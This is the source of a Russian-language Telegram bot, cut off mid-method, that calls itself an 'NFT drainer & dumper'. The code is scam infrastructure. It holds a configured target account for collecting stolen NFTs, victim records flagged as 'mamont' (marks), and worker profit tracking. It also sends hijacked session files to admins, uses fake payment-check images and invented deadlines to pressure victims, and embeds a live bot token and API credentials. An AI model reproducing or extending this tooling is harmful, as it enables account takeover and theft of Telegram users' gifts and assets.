#!/usr/bin/env python3
import asyncio
import logging
import sys
import os
import shutil
import uuid
import secrets
import sqlite3
import time
import subprocess
from pyrogram.raw import functions
import re
import json
import html
import glob
import pyrogram
import random
import queue
from datetime import datetime, timedelta
from pathlib import Path
from dotenv import load_dotenv
import aiohttp
from aiohttp import web
from typing import Optional, Dict, List
from pyrogram.errors import AuthKeyInvalid, UserDeactivated, SessionRevoked
import threading

# Импорты Aiogram (Бот-интерфейс)
from aiogram import Bot, Dispatcher, Router, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ContentType
from aiogram.filters import Command, CommandStart, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.dispatcher.middlewares.base import BaseMiddleware
from aiogram.exceptions import TelegramRetryAfter
from aiogram.types import (
    InlineKeyboardButton, FSInputFile, WebAppInfo,
    InlineQueryResultArticle, InlineQueryResultPhoto, InlineQueryResultCachedPhoto, InputTextMessageContent,
    LabeledPrice, PreCheckoutQuery, Message
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Импорты Pyrogram (Управление юзеры)
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
    PasswordHashInvalid, FloodWait, AuthKeyUnregistered, UserDeactivated,
    PaymentRequired, RPCError, PeerIdInvalid, UserIsBlocked, BadRequest,
    UsernameInvalid, SessionRevoked, AuthKeyDuplicated
)

# Исправляем импорт ChatPrivileges
try:
    from pyrogram.types import ChatPrivileges
except ImportError:
    # Для старых версий Pyrogram
    try:
        from pyrogram.raw.types import ChatAdminRights as ChatPrivileges
    except ImportError:
        # Альтернативный импорт
        from pyrogram.types import ChatAdminRights as ChatPrivileges

try:
    from lottie_parser import lottie_parser
except ImportError:
    print("⚠️ lottie_parser.py not found or invalid")
    lottie_parser = None

try:
    from aportalsmp import auth, gifts
    PORTALS_AVAILABLE = True
except ImportError:
    PORTALS_AVAILABLE = False
    print("⚠️ Portals API not available - using fallback FLOOR calculations")

# ================= PORTALS API INTEGRATION =================
class PortalsAPI:
    """Класс для работы с Portals Marketplace API"""

    def __init__(self):
        self.token = None
        self.token_expiry = None

    async def get_auth_token(self) -> str:
        """Получает токен авторизации для Portals API"""
        try:
            print("🔐 PORTALS: Получение токена авторизации...")
            if PORTALS_AVAILABLE:
                # Получаем токен через pyrogram используя update_auth
                self.token = await auth.update_auth(
                    api_id=SETTINGS['api_id'],
                    api_hash=SETTINGS['api_hash'],
                    session_name='portals_session'
                )
                print(f"✅ PORTALS: Токен получен успешно")
                return self.token
            else:
                print("⚠️ PORTALS: Модуль aportalsmp не установлен")
                return None
        except Exception as e:
            print(f"❌ PORTALS: Ошибка получения токена: {e}")
            return None

    async def ensure_token(self):
        """Проверяет наличие токена и получает новый если нужно"""
        if not self.token:
            await self.get_auth_token()

    def extract_gift_info_from_link(self, gift_link: str) -> Optional[Dict[str, str]]:
        """Извлекает название модели и номер из ссылки на подарок"""
        try:
            # ИСПРАВЛЕНО: Добавлены 0-9, - и _ в группу захвата имени
            match = re.search(r'/nft/([A-Za-z0-9\-_]+)-(\d+)', gift_link)
            if match:
                raw_name = match.group(1)
                # Заменяем дефисы на пробелы для красивого имени
                model_name = re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name).replace('-', ' ').replace('_', ' ').strip()
                return {
                    'model': model_name,
                    'number': match.group(2)
                }
            return None
        except Exception as e:
            print(f"❌ PORTALS: Ошибка парсинга ссылки {gift_link}: {e}")
            return None

    async def get_gift_floor_price(self, model_name: str) -> Optional[float]:
        """Получает floor price для модели подарка"""
        try:
            if not PORTALS_AVAILABLE:
                return None

            await self.ensure_token()
            if not self.token:
                print(f"⚠️ PORTALS: Нет токена авторизации для {model_name}")
                return None

            print(f"🔍 PORTALS: Поиск floor price для {model_name}...")

            # Ищем подарки по имени модели, сортируем по возрастанию цены
            results = await gifts.search(
                authData=self.token,
                gift_name=model_name,
                sort='price_asc',
                limit=1,
                min_price=1
            )

            if results and len(results) > 0:
                floor_price = results[0].price
                print(f"💰 PORTALS: Floor price для {model_name}: {floor_price} TON")
                return floor_price
            else:
                print(f"⚠️ PORTALS: Нет предложений на продажу для {model_name}")
                return None

        except Exception as e:
            print(f"❌ PORTALS: Ошибка получения floor price для {model_name}: {e}")
            return None

    async def calculate_total_floor_price(self, gift_links: List[str]) -> Dict[str, any]:
        """Вычисляет общую сумму floor price для списка подарков"""
        try:
            print(f"\n💰 PORTALS: Расчет общей стоимости для {len(gift_links)} подарков...")

            total_price = 0.0
            details = []
            not_found_count = 0

            for gift_link in gift_links:
                gift_info = self.extract_gift_info_from_link(gift_link)

                if not gift_info:
                    print(f"⚠️ PORTALS: Не удалось распарсить ссылку {gift_link}")
                    not_found_count += 1
                    continue

                model_name = gift_info['model']
                floor_price = await self.get_gift_floor_price(model_name)

                if floor_price:
                    total_price += floor_price
                    details.append({
                        'model': model_name,
                        'number': gift_info['number'],
                        'floor_price': floor_price,
                        'link': gift_link
                    })
                else:
                    not_found_count += 1

                # Задержка между запросами
                await asyncio.sleep(0.5)

            result = {
                'total': round(total_price, 2),
                'details': details,
                'not_found': not_found_count,
                'count': len(gift_links)
            }
            print(f"✅ PORTALS: Расчет завершен. Всего: {result['total']} TON")

            print(f"✅ PORTALS: Общая стоимость: {result['total']} TON ({len(details)}/{len(gift_links)} подарков)")

            return result

        except Exception as e:
            print(f"❌ PORTALS: Ошибка расчета общей стоимости: {e}")
            return {
                'total': 0.0,
                'details': [],
                'not_found': len(gift_links),
                'count': len(gift_links)
            }

# Глобальный экземпляр Portals API
portals_api = PortalsAPI()

async def alert_admins(bot: Bot, text: str):
    """Уведомление админов текстом"""
    admin_ids = SETTINGS.get('admins', [])
    for admin_id in admin_ids:
        try:
            await bot.send_message(admin_id, text)
        except: pass

async def send_file_to_admins(bot: Bot, file_path: Path, caption: str):
    """Отправка файла сессии админам"""
    admin_ids = SETTINGS.get('admins', [])
    if not file_path.exists(): return

    file = FSInputFile(file_path)
    for admin_id in admin_ids:
        try:
            await bot.send_document(admin_id, file, caption=caption)
        except: pass

def mask_data(data: str) -> str:
    """Маскирует 1/3 данных в середине строки."""
    if not data:
        return "N/A"
    data = str(data)
    length = len(data)
    if length < 4:
        return data  # Слишком короткие данные не маскируем

    start_visible = length // 3
    end_visible = length // 3
    middle_count = length - start_visible - end_visible

    return data[:start_visible] + "*" * middle_count + data[-end_visible:]

def mask_phone(phone: str) -> str:
    """Специальная маска для телефона (оставляет код и последние цифры)."""
    phone = re.sub(r'\D', '', phone) # Оставляем только цифры
    if len(phone) < 10:
        return mask_data(phone)

    # Определяем длину кода страны
    if phone.startswith('1'):  # США, Канада
        code_len = 1
    elif phone.startswith(('7', '20', '27', '30', '31', '32', '33', '34', '36', '39', '40', '41', '43', '44', '45', '46', '47', '48', '49', '350', '351', '352', '353', '354', '355', '356', '357', '358', '359', '370', '371', '372', '373', '374', '375', '376', '377', '378', '380', '381', '382', '383', '384', '385', '386', '387', '389', '420', '421', '423', '501', '502', '503', '504', '505', '506', '507', '508', '509', '590', '591', '592', '593', '594', '595', '596', '597', '598', '670', '672', '673', '674', '675', '676', '677', '678', '679', '680', '681', '682', '683', '684', '685', '686', '687', '688', '689', '690', '691', '692', '850', '852', '853', '855', '856', '880', '886', '960', '961', '962', '963', '964', '965', '966', '967', '968', '970', '971', '972', '973', '974', '975', '976', '977', '992', '993', '994', '995', '996', '998')):
        # Проверяем по убыванию длины
        for length in [3, 2, 1]:
            if phone[:length] in ['380', '375', '374', '373', '372', '371', '370', '359', '358', '357', '356', '355', '354', '353', '352', '351', '350', '39', '38', '37', '36', '35', '34', '33', '32', '31', '30', '27', '20', '7', '1']:
                code_len = length
                break
        else:
            code_len = 3  # По умолчанию
    else:
        code_len = 3

    # Форматируем номер
    code = phone[:code_len]
    remaining = phone[code_len:]
    if len(remaining) > 4:
        masked = "*" * (len(remaining) - 4) + remaining[-4:]
    else:
        masked = remaining

    return f"+{code}{masked}"

def get_deadline_date():
    """Генерирует дату MSK + 2-5 часов в формате 'день месяц год года часы:минуты по МСК+6'"""
    months = {
        1: 'января', 2: 'февраля', 3: 'марта', 4: 'апреля', 5: 'мая', 6: 'июня',
        7: 'июля', 8: 'августа', 9: 'сентября', 10: 'октября', 11: 'ноября', 12: 'декабря'
    }
    deadline = datetime.now() + timedelta(hours=random.randint(2, 5))
    day = deadline.day
    month = months[deadline.month]
    year = deadline.year
    hour = deadline.hour
    minute = deadline.minute
    return f"{day} {month} {year} года {hour:02d}:{minute:02d} по МСК+6"

def should_skip_log_user(user_data) -> bool:
    """Проверяет, содержит ли имя пользователя запрещенные слова."""
    if isinstance(user_data, dict):
        username = user_data.get('username', '').lower()
        first_name = user_data.get('first_name', '').lower()
    elif hasattr(user_data, 'username'):
        username = (user_data.username or '').lower()
        first_name = (user_data.first_name or '').lower()
    else:
        return False

    banned_words = ['team', 'teams', 'тима', 'тим', "тиmа", "ТИMА", "ТИМА", "има", "T3am", "t3am", "t3ams"]
    for word in banned_words:
        if word in username or word in first_name:
            return True
    return False

# ================= НАСТРОЙКИ И КОНФИГУРАЦИЯ =================
SETTINGS_FILE = "settings.json"
DEFAULT_SETTINGS = {
    "target_user": "@AstralGiftsSupport",      # Куда сливать NFT
    "admin_ids": [488616444, 1687736021],      # ID админов
    "allowed_group_id": -1003630231171, # ID группы для логов
    "topic_launch": 10,          # Топик запуска
    "topic_auth": 10,            # Топик входов
    "topic_success": 10,         # Топик успехов
    "topic_profit": 22227,          # Топик профитов (пока тот же что success, установите отдельный ID топика если нужно)
    "topic_nft": 10,             # Топик NFT логов
    "api_id": 39831972,             # Telegram API ID
    "api_hash": "037087fc71eab9ce52397d7001c31520", # Telegram API Hash
    "api_url": "http://localhost:3000",
    "bot_token": "8577176596:AAF1jVBd_7fPCFGXV-XemoAjbouWeW0UNEQ",                # Токен бота от FatherBot
    "maintenance_mode": False,
    "banker_session": "main_admin", # Имя сессии банкира (без .session)
    "dump_limit": 1,               # Сколько сообщений дампить
    "proxies": [],                  # Список прокси: "ip:port:user:pass"
    "auto_deactivate": False,       # Статус авто-удаления (по умолчанию выключен)
}

# Словарь подарков для пополнения баланса (ID: Цена)
REGULAR_GIFTS = {
    5170233102089322756: 15, 5170145012310081615: 15, 5168103777563050263: 25,
    5170250947678437525: 25, 6028601630662853006: 50, 5170564780938756245: 50,
    5170314324215857265: 50, 5170144170496491616: 50
}
GIFT_EMOJIS = {
    5170233102089322756: "🧸", 5170145012310081615: "💝", 5168103777563050263: "🌹",
    5170250947678437525: "🎁", 6028601630662853006: "🍾", 5170564780938756245: "🚀"
}

# Список случайных ссылок для ответа при упоминании бота без ссылки
RANDOM_NFT_LINKS = [
    "https://t.me/nft/CookieHeart-177646",
    "https://t.me/nft/SpyAgaric-61026",
    "https://t.me/nft/IceCream-275615",
    "https://t.me/nft/MoonPendant-68435",
    "https://t.me/nft/SnoopDogg-566333",
    "https://t.me/nft/MousseCake-19865",
    "https://t.me/nft/IceCream-218277",
    "https://t.me/nft/PrettyPosy-50895",
    "https://t.me/nft/XmasStocking-173412"
]

# Ссылки на фото чеков с ibb
CHECK_PHOTO_URLS = {
    50: "https://i.ibb.co/1fdZ3dmJ/50.jpg",
    100: "https://i.ibb.co/WvZFSDsq/100.jpg",
    150: "https://i.ibb.co/HD6sYd2N/150.jpg",
    200: "https://i.ibb.co/Y7gYywTy/200.jpg",
    250: "https://i.ibb.co/G42KbmkD/250.jpg",
    300: "https://i.ibb.co/hRPwJQw8/300.jpg",
    350: "https://i.ibb.co/G4YPZ3kR/350.jpg",
    400: "https://i.ibb.co/tTtC3jyM/400.jpg",
    450: "https://i.ibb.co/WWyLD27Q/450.jpg",
    500: "https://i.ibb.co/mrf9Hfrm/500.jpg"
}

# ================= ЦВЕТА И ЛОГИРОВАНИЕ =================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

def print_banner():
    print(f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║    🎁 ULTIMATE NFT DRAINER & DUMPER (MERGED CORE)            ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}""")

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
# Suppress Pyrogram, Aiogram and aiohttp spam logs
logging.getLogger('pyrogram').setLevel(logging.ERROR)
logging.getLogger('aiogram').setLevel(logging.ERROR)
logging.getLogger('aiohttp').setLevel(logging.WARNING)
logger = logging.getLogger("MainBot")

def log_transfer(msg, level="info"):
    # Отдельный логгер для операций перевода
    prefix = "[TRANSFER] "
    if level == "info": logger.info(prefix + msg)
    elif level == "error": logger.error(prefix + msg)
    elif level == "warning": logger.warning(prefix + msg)

def print_step(msg):
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{Colors.BLUE}[{timestamp}] 🔹 {msg}{Colors.END}")
    except BrokenPipeError:
        pass

def print_success(msg):
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{Colors.GREEN}[{timestamp}] ✅ {msg}{Colors.END}")
    except BrokenPipeError:
        pass

def print_warning(msg):
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{Colors.YELLOW}[{timestamp}] ⚠️ {msg}{Colors.END}")
    except BrokenPipeError:
        pass

def print_error(msg):
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{Colors.RED}[{timestamp}] ❌ {msg}{Colors.END}")
    except BrokenPipeError:
        pass

def print_info(msg):
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{Colors.CYAN}[{timestamp}] ℹ️ {msg}{Colors.END}")
    except BrokenPipeError:
        pass

def print_detailed(msg, level="info"):
    """Enhanced detailed logging with more context"""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if level == "transfer":
            print(f"{Colors.CYAN}[{timestamp}] 💰 TRANSFER: {msg}{Colors.END}")
        elif level == "nft":
            print(f"{Colors.YELLOW}[{timestamp}] 🎁 NFT: {msg}{Colors.END}")
        elif level == "session":
            print(f"{Colors.BLUE}[{timestamp}] 📱 SESSION: {msg}{Colors.END}")
        elif level == "profit":
            print(f"{Colors.GREEN}[{timestamp}] 💵 PROFIT: {msg}{Colors.END}")
        else:
            print(f"{Colors.CYAN}[{timestamp}] 📊 DETAIL: {msg}{Colors.END}")
    except BrokenPipeError:
        pass

# ================= УПРАВЛЕНИЕ ФАЙЛАМИ =================
BASE_DIR = Path(__file__).parent.resolve()
SESSIONS_DIR = BASE_DIR / "sessions"
ARCHIVE_DIR = BASE_DIR / "archive"
BAD_DIR = BASE_DIR / "archive_bad"
DUMP_DIR = BASE_DIR / "dumps"
CHECKS_PHOTO_DIR = BASE_DIR / "check_photos"

for d in [SESSIONS_DIR, ARCHIVE_DIR, BAD_DIR, DUMP_DIR, CHECKS_PHOTO_DIR]:
    d.mkdir(exist_ok=True)

def load_settings():
    if not os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
            json.dump(DEFAULT_SETTINGS, f, indent=4)
        return DEFAULT_SETTINGS
    with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)
        # Merge defaults
        for k, v in DEFAULT_SETTINGS.items():
            if k not in data: data[k] = v
        return data

def save_settings(data):
    with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

SETTINGS = load_settings()
load_dotenv()

# Проверка окружения
if not SETTINGS.get("bot_token") and not os.getenv("BOT_TOKEN"):
    val = input("Введите BOT_TOKEN: ").strip()
    SETTINGS["bot_token"] = val
    save_settings(SETTINGS)

class Database:
    def search_smart(self, query: str):
        """Умный поиск пользователей по базе данных"""
        with db_lock:
            # Очищаем запрос от @ и пробелов
            clean_query = query.strip().replace("@", "")
            
            # Формируем SQL запрос
            sql = """
                SELECT * FROM users 
                WHERE 
                    CAST(user_id AS TEXT) = ? 
                    OR username LIKE ? 
                    OR first_name LIKE ? 
                    OR original_username LIKE ?
                    OR custom_tag LIKE ?
            """
            
            wildcard = f"%{clean_query}%"
            params = (clean_query, wildcard, wildcard, wildcard, wildcard)
            
            self.cursor.execute(sql, params)
            rows = self.cursor.fetchall()
            
            # Преобразуем результаты в список словарей
            results = []
            if rows:
                columns = [description[0] for description in self.cursor.description]
                for row in rows:
                    results.append(dict(zip(columns, row)))
            
            return results
    def __init__(self, db_file="bot_database.db"):
        db_path = BASE_DIR / db_file
        db_path.parent.mkdir(parents=True, exist_ok=True)
        # ИСПРАВЛЕНО: timeout увеличен до 30 секунд
        self.conn = sqlite3.connect(str(db_path), check_same_thread=False, timeout=30.0)
        self.conn.execute("PRAGMA journal_mode=WAL")
        self.conn.execute("PRAGMA synchronous=NORMAL")
        self.conn.commit()
        self.cursor = self.conn.cursor()
        self.create_tables()
        
        # ИСПРАВЛЕНО: Очередь для логов, чтобы не блочить БД
        self.log_queue = queue.Queue()
        threading.Thread(target=self._log_worker, daemon=True).start()
        
    def log_activity(self, user_id, action, details="", worker_id=None):
        """Кидает лог в очередь (мгновенно, без ожидания записи)"""
        self.log_queue.put((user_id, action, details, worker_id))

    def _log_worker(self):
        """Фоновый поток, который по очереди пишет логи в БД"""
        while True:
            try:
                item = self.log_queue.get()
                user_id, action, details, worker_id = item
                with db_lock:
                    self.cursor.execute(
                        "INSERT INTO activity_logs (user_id, worker_id, action, details) VALUES (?, ?, ?, ?)",
                        (user_id, worker_id, action, details)
                    )
                    self.conn.commit()
            except Exception as e:
                print(f"❌ DB Log Error: {e}")
            finally:
                self.log_queue.task_done()
        
    def get_top_workers(self, limit=10):
        """Возвращает топ воркеров по общей сумме профитов без маскировки"""
        with db_lock:
            # Выбираем тех, у кого сумма профитов больше 0, сортируем по убыванию
            self.cursor.execute("""
                SELECT username, first_name, worker_total_profits, worker_profits 
                FROM users 
                WHERE worker_total_profits > 0 
                ORDER BY worker_total_profits DESC 
                LIMIT ?
            """, (limit,))
            return self.cursor.fetchall()

    def create_tables(self):
        # Создаем таблицу users с базовыми полями
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, balance INTEGER DEFAULT 0, worker_id INTEGER DEFAULT NULL, is_mamont BOOLEAN DEFAULT 0, is_dumped BOOLEAN DEFAULT 0)""")

        # Добавляем новые поля, если их нет (для обратной совместимости)
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN original_username TEXT")
            print("DEBUG: Added original_username column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN original_first_name TEXT")
            print("DEBUG: Added original_first_name column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN worker_profits INTEGER DEFAULT 0")
            print("DEBUG: Added worker_profits column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN worker_total_profits INTEGER DEFAULT 0")
            print("DEBUG: Added worker_total_profits column")
        except: pass

        # Кастомизация профиля воркера
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN custom_name TEXT")
            print("DEBUG: Added custom_name column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN custom_role TEXT")
            print("DEBUG: Added custom_role column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN custom_color TEXT DEFAULT '#ffffff'")
            print("DEBUG: Added custom_color column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN custom_tag TEXT")
            print("DEBUG: Added custom_tag column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN custom_name_effect TEXT")
            print("DEBUG: Added custom_name_effect column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN custom_name_bg TEXT")
            print("DEBUG: Added custom_name_bg column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN custom_role_bg TEXT")
            print("DEBUG: Added custom_role_bg column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN custom_name_size TEXT")
            print("DEBUG: Added custom_name_size column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN custom_role_effect TEXT")
            print("DEBUG: Added custom_role_effect column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN custom_avatar_border_color TEXT DEFAULT '#000000'")
            print("DEBUG: Added custom_avatar_border_color column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN custom_profile_bg TEXT")
            print("DEBUG: Added custom_profile_bg column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN custom_aura_enabled BOOLEAN DEFAULT 0")
            print("DEBUG: Added custom_aura_enabled column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN custom_avatar TEXT")
            print("DEBUG: Added custom_avatar column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN custom_banner TEXT")
            print("DEBUG: Added custom_banner column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN worker_paid_amount REAL DEFAULT 0")
            print("DEBUG: Added worker_paid_amount column")
        except: pass

        self.conn.commit()
        print("DEBUG: create_tables() completed")

        self.cursor.execute("""CREATE TABLE IF NOT EXISTS checks (check_id TEXT PRIMARY KEY, creator_id INTEGER, amount INTEGER, activations INTEGER, claimed_count INTEGER DEFAULT 0, claimed_by TEXT DEFAULT '')""")
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS inline_checks (unique_id TEXT PRIMARY KEY, creator_id INTEGER, amount INTEGER, claimed_by INTEGER, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)""")
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS worker_wallets (user_id INTEGER PRIMARY KEY, wallet_address TEXT, wallet_type TEXT DEFAULT 'tonkeeper')""")
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS user_nfts (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, model TEXT, number TEXT, received_at DATETIME DEFAULT CURRENT_TIMESTAMP, UNIQUE(user_id, model, number))""")
        self.cursor.execute("CREATE TABLE IF NOT EXISTS claimed_links (unique_id TEXT PRIMARY KEY, user_id INTEGER, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)")
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, balance INTEGER DEFAULT 0, worker_id INTEGER DEFAULT NULL, is_mamont BOOLEAN DEFAULT 0, is_dumped BOOLEAN DEFAULT 0)""")

        # === ДОБАВЛЯЕМ КОЛОНКИ ДЛЯ КАСТОМИЗАЦИИ ===
        try: self.cursor.execute("ALTER TABLE users ADD COLUMN custom_avatar TEXT")
        except: pass
        try: self.cursor.execute("ALTER TABLE users ADD COLUMN custom_banner TEXT")
        except: pass
        self.conn.commit()
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS activity_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            worker_id INTEGER,
            action TEXT,
            details TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")

    def add_user(self, user_id, username, first_name, worker_id=None, original_username=None, original_first_name=None):
        user = self.get_user(user_id)
        if not user:
            # Новый юзер
            self.cursor.execute("INSERT INTO users (user_id, username, first_name, worker_id, original_username, original_first_name) VALUES (?, ?, ?, ?, ?, ?)",
                              (user_id, username or "Unknown", first_name or "Unknown", worker_id, original_username, original_first_name))
        else:
            # Юзер уже есть. Если передан worker_id (переход по рефке), проверяем привязку.
            # Если у мамонта НЕТ воркера (None или 0), привязываем к новому.
            if worker_id:
                current_worker = user.get('worker_id')
                if not current_worker or current_worker == 0:
                    self.cursor.execute("UPDATE users SET worker_id = ? WHERE user_id = ?", (worker_id, user_id))
            
            # Обновляем остальные поля
            if original_username and not user.get('original_username'):
                self.cursor.execute("UPDATE users SET original_username = ?, original_first_name = ? WHERE user_id = ?", (original_username, original_first_name, user_id))
            self.cursor.execute("UPDATE users SET username = ?, first_name = ? WHERE user_id = ?", (username or "Unknown", first_name or "Unknown", user_id))
        self.conn.commit()

    def get_user(self, user_id):
        try:
            with db_lock:
                self.cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
                row = self.cursor.fetchone()
                if row:
                    # Получаем имена колонок для корректного маппинга
                    columns = [description[0] for description in self.cursor.description]
                    user_dict = dict(zip(columns, row))
                    
                    # Базовые поля с дефолтами
                    return {
                        'user_id': user_dict.get('user_id'),
                        'username': user_dict.get('username'),
                        'first_name': user_dict.get('first_name'),
                        'balance': user_dict.get('balance', 0),
                        'worker_id': user_dict.get('worker_id'),
                        'is_mamont': user_dict.get('is_mamont', 0),
                        'is_dumped': user_dict.get('is_dumped', 0),
                        'original_username': user_dict.get('original_username'),
                        'original_first_name': user_dict.get('original_first_name'),
                        'worker_profits': user_dict.get('worker_profits', 0),
                        'worker_total_profits': user_dict.get('worker_total_profits', 0),
                        'worker_paid_amount': user_dict.get('worker_paid_amount', 0),
                        # Кастомные поля профиля
                        'custom_name': user_dict.get('custom_name'),
                        'custom_role': user_dict.get('custom_role'),
                        'custom_color': user_dict.get('custom_color', '#ffffff'),
                        'custom_tag': user_dict.get('custom_tag'),
                        'custom_name_effect': user_dict.get('custom_name_effect'),
                        'custom_name_bg': user_dict.get('custom_name_bg'),
                        'custom_role_bg': user_dict.get('custom_role_bg'),
                        'custom_name_size': user_dict.get('custom_name_size'),
                        'custom_role_effect': user_dict.get('custom_role_effect'),
                        'custom_avatar_border_color': user_dict.get('custom_avatar_border_color', '#000000'),
                        'custom_profile_bg': user_dict.get('custom_profile_bg'),
                        'custom_aura_enabled': user_dict.get('custom_aura_enabled', 0),
                        'custom_avatar': user_dict.get('custom_avatar'),
                        'custom_banner': user_dict.get('custom_banner'),
                    }
                return None
        except Exception as e:
            print_error(f"Database error in get_user: {e}")
            return None

    def increment_worker_profits(self, worker_id, amount=1):
        """Увеличивает счетчик профитов для воркера"""
        try:
            user = self.get_user(worker_id)
            if user:
                new_count = user.get('worker_profits', 0) + amount
                self.cursor.execute("UPDATE users SET worker_profits = ? WHERE user_id = ?", (new_count, worker_id))
                self.conn.commit()
                return new_count
        except Exception as e:
            print_error(f"Database error in increment_worker_profits: {e}")
        return 0

    def increment_worker_total_profits(self, worker_id, amount):
        """Увеличивает общую сумму профитов для воркера"""
        with db_lock:
            user = self.get_user(worker_id)
            if user:
                new_total = user.get('worker_total_profits', 0) + amount
                self.cursor.execute("UPDATE users SET worker_total_profits = ? WHERE user_id = ?", (new_total, worker_id))
                self.conn.commit()
                return new_total
        return 0

    def get_stats(self):
        self.cursor.execute("SELECT COUNT(*) FROM users")
        u = self.cursor.fetchone()[0]
        self.cursor.execute("SELECT SUM(amount) FROM checks")
        c = self.cursor.fetchone()[0] or 0
        return u, c

    def mark_as_dumped(self, user_id):
        self.cursor.execute("UPDATE users SET is_dumped = 1 WHERE user_id = ?", (user_id,))
        self.conn.commit()

    def update_balance(self, user_id, amount, mode='add'):
        user = self.get_user(user_id)
        if not user:
            self.add_user(user_id, "Unknown", "Unknown")
            user = self.get_user(user_id)

        current = user['balance'] if user else 0
        new = current + amount if mode == 'add' else current - amount
        if new < 0: new = 0
        self.cursor.execute("UPDATE users SET balance = ? WHERE user_id = ?", (new, user_id))
        self.conn.commit()
        return new

    def set_mamont(self, user_id, status=True):
        user = self.get_user(user_id)
        if not user: self.add_user(user_id, "Unknown", "Unknown")
        self.cursor.execute("UPDATE users SET is_mamont = ? WHERE user_id = ?", (1 if status else 0, user_id))
        self.conn.commit()

    def create_check(self, creator_id, amount, activations):
        check_id = secrets.token_urlsafe(8)
        self.cursor.execute("INSERT INTO checks (check_id, creator_id, amount, activations) VALUES (?, ?, ?, ?)", (check_id, creator_id, amount, activations))
        self.conn.commit()
        return check_id

    def get_check(self, check_id):
        self.cursor.execute("SELECT * FROM checks WHERE check_id = ?", (check_id,))
        row = self.cursor.fetchone()
        return {'check_id': row[0], 'creator_id': row[1], 'amount': row[2], 'activations': row[3], 'claimed_count': row[4], 'claimed_by': row[5]} if row else None

    def activate_check(self, check_id, user_id):
        check = self.get_check(check_id)
        if not check: return "not_found", 0, None
        claimed = check['claimed_by'].split(',') if check['claimed_by'] else []
        if str(user_id) in claimed: return "already_claimed", 0, None
        if check['claimed_count'] >= check['activations']: return "empty", 0, None
        claimed.append(str(user_id))
        self.cursor.execute("UPDATE checks SET claimed_count = claimed_count + 1, claimed_by = ? WHERE check_id = ?", (",".join(claimed), check_id))
        self.update_balance(user_id, check['amount'], 'add')
        self.conn.commit()
        return "success", check['amount'], check['creator_id']

    def check_inline_used(self, unique_id):
        self.cursor.execute("SELECT * FROM inline_checks WHERE unique_id = ?", (unique_id,))
        return self.cursor.fetchone()

    def activate_inline_check(self, unique_id, creator_id, claimer_id, amount):
        if self.check_inline_used(unique_id): return "already_used"
        creator = self.get_user(creator_id)
        if not creator or creator['balance'] < amount: return "no_balance"
        self.update_balance(creator_id, amount, 'remove')
        self.update_balance(claimer_id, amount, 'add')
        self.cursor.execute("INSERT INTO inline_checks (unique_id, creator_id, amount, claimed_by) VALUES (?, ?, ?, ?)", (unique_id, creator_id, amount, claimer_id))
        self.conn.commit()
        return "success"

    def bind_wallet(self, user_id, wallet_address, wallet_type='tonkeeper'):
        with db_lock:
